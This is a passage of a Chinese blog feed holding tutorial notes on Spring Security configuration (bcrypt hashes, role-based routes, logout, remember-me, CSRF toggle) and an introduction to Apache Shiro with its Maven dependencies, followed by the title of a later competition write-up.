12密码：123$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr&#x2F;ryuzeOFR89UzdP28s1QGoe密码：123456$2a$12$8SKvIlSNNQlI0u3GqABk2uFQ&#x2F;5NygMm9rCuyERb1CUybeboDntCyG密文由4段组成：# $2a 版本# $12 强度# $2a$12后前22位 随机盐值# 最后31位 真正的散列值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="登录配置"><a href="#登录配置" class="headerlink" title="登录配置"></a>登录配置</h3><p>依旧是在 WebSecurityConfigurerAdapter 的实现类中进行配置</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 开启登录配置</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//表示访问 /hello 这个接口，所有角色都可访问</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// 只有 admin 角色能访问这个路由</span>            <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//表示剩余的其他接口，登录之后就能访问</span>            <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 定义登录页面，未登录时，访问一个需要登录之后才能访问的接口，会自动跳转到该页面</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们要是以非admin的角色访问&#x2F;admin路由的话就会有下面的回显：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715171904192.png" alt="image-20240715171904192"></p><p>接下来再加上上面的账密配置：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 开启登录配置</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//表示访问 /hello 这个接口，所有角色都可访问</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// 只有 admin 角色能访问这个路由</span>            <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//表示剩余的其他接口，登录之后就能访问</span>            <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 定义登录页面，未登录时，访问一个需要登录之后才能访问的接口，会自动跳转到该页面</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">AuthenticationManagerBuilder</span> auth<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 密码编码：PasswordEncoder</span>        auth<span class="token punctuation">.</span><span class="token function">inMemoryAuthentication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">passwordEncoder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"gbc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"486"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"nina"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从而实现了认证和授权</p><p>接下来添加注销功能：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 开启登录配置</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//表示访问 /hello 这个接口，所有角色都可访问</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// 只有 admin 角色能访问这个路由</span>        <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//表示剩余的其他接口，登录之后就能访问</span>        <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 定义登录页面，未登录时，访问一个需要登录之后才能访问的接口，会自动跳转到该页面</span>    http<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注销并跳转到 /hello</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样访问&#x2F;logout就可以注销了</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715173012743.png" alt="image-20240715173012743"></p><p>然后再添加几个其它的功能：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 开启登录配置</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//表示访问 /hello 这个接口，所有角色都可访问</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// 只有 admin 角色能访问这个路由</span>        <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//表示剩余的其他接口，登录之后就能访问</span>        <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 定义登录页面，未登录时，访问一个需要登录之后才能访问的接口，会自动跳转到该页面</span>    http<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注销并跳转到 /hello</span>    http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 关闭csrf功能</span>    http<span class="token punctuation">.</span><span class="token function">rememberMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rememberMeParameter</span><span class="token punctuation">(</span><span class="token string">"remember"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 记住我，默认保存两周，可以自定义接收前端的参数</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇总一下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecuritydemo<span class="token punctuation">.</span></span><span class="token class-name">Config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>authentication<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">AuthenticationManagerBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span></span><span class="token class-name">WebSecurityConfigurerAdapter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>bcrypt<span class="token punctuation">.</span></span><span class="token class-name">BCryptPasswordEncoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>password<span class="token punctuation">.</span></span><span class="token class-name">PasswordEncoder</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 开启登录配置</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//表示访问 /hello 这个接口，所有角色都可访问</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// 只有 admin 角色能访问这个路由</span>            <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//表示剩余的其他接口，登录之后就能访问</span>            <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 定义登录页面，未登录时，访问一个需要登录之后才能访问的接口，会自动跳转到该页面</span>        http<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 注销并跳转到 /hello</span>        http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 关闭csrf功能</span>        http<span class="token punctuation">.</span><span class="token function">rememberMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rememberMeParameter</span><span class="token punctuation">(</span><span class="token string">"remember"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 记住我，默认保存两周，可以自定义接收前端的参数</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">AuthenticationManagerBuilder</span> auth<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 密码编码：PasswordEncoder</span>        auth<span class="token punctuation">.</span><span class="token function">inMemoryAuthentication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">passwordEncoder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"gbc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"486"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"nina"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="忽略拦截"><a href="#忽略拦截" class="headerlink" title="忽略拦截"></a>忽略拦截</h3><p>如果某一个请求地址不需要拦截的话，有两种方式实现：</p><ul><li><p>设置该地址匿名访问</p></li><li><p>直接过滤掉该地址，即该地址不走 Spring Security 过滤器链</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">WebSecurity</span> web<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        web<span class="token punctuation">.</span><span class="token function">ignoring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/vercode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><blockquote><p>Apache Shiro是一个强大灵活的开源框架，可以完全处理身份验证、授权、加密和会话管理</p></blockquote><p>参考：<a href="https://drun1baby.top/2022/07/07/Java%E5%BC%80%E5%8F%91%E4%B9%8Bshiro%E5%AD%A6%E4%B9%A0">https://drun1baby.top/2022/07/07/Java%E5%BC%80%E5%8F%91%E4%B9%8Bshiro%E5%AD%A6%E4%B9%A0</a></p><p>功能：</p><ul><li><strong>Authentication（认证）：</strong>用户身份识别，通常被称为用户“登录”</li><li><strong>Authorization（授权）：</strong>访问控制。比如某个用户是否具有某个操作的使用权限。</li><li><strong>Session Management（会话管理）：</strong>特定于用户的会话管理，甚至在非 Web 或 EJB 应用程序。</li><li><strong>Cryptography（加密）：</strong>在对数据源使用加密算法加密的同时，保证易于使用。</li></ul><p>Shiro 架构包含三个主要的理念：</p><ul><li>Subject：当前用户，Subject 可以是一个人，但也可以是第三方服务、守护进程帐户、时钟守护任务或者其它–当前和软件交互的任何事件。一般 Subject 这里是连前端数据的。</li><li>SecurityManager：管理所有 Subject，SecurityManager 是 Shiro 架构的核心，配合内部安全组件共同组成安全伞。</li><li>Realms：用于进行权限信息的验证，我们自己实现。Realm 本质上是一个特定的安全 DAO：它封装与数据源连接的细节，得到  Shiro 所需的相关的数据。在配置 Shiro 的时候，你必须指定至少一个 Realm  来实现认证（authentication）和&#x2F;或授权（authorization）。</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.shiro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>shiro-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.4.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!-- configure logging --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jcl-over-slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>slf4j-log4j12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;开发与安全缺一不可，虽然不知道自己到底少学了多少基础，但是现在就先跟着&lt;a href=&quot;https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file&quot;&gt;Drun1baby的学习路线&lt;/a&gt;吧&lt;/p&gt;
&lt;p&gt;java第一步，先学SpringBoot，同时我这里也会稍微学一下Spring和SpringMVC&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1PE411i7CV&quot;&gt;https://www.bilibili.com/video/BV1PE411i7CV&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf&quot;&gt;https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/06/28/SpringBoot/image-20240628122350310.png&quot; alt=&quot;image-20240628122350310&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN华东南分区赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/"/>
